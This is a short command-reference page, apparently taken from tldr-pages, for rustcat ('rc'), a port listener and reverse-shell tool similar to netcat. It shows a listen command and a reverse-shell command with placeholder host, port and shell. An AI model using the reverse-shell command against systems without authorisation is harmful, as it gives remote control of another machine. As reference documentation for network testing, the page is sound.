---
id: common.rc
title: Rc
desc: ''
updated: 1642441815065
created: 1642441815065
stub: false
isDir: false
gitNotePath: 'pages/{{ noteHiearchy }}.md'
sources:
  - name: tldr-pages
    url: 'https://github.com/tldr-pages/tldr/blob/master/LICENSE.md'
    license: Creative Commons
---
# rc

> A modern simplistic port listener & reverse shell.
> Similar to `nc`.
> More information: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Start listening on a specific port:

`rc -lp {{port}}`

- Start a reverse shell:

`rc {{host}} {{port}} -r {{shell}}`

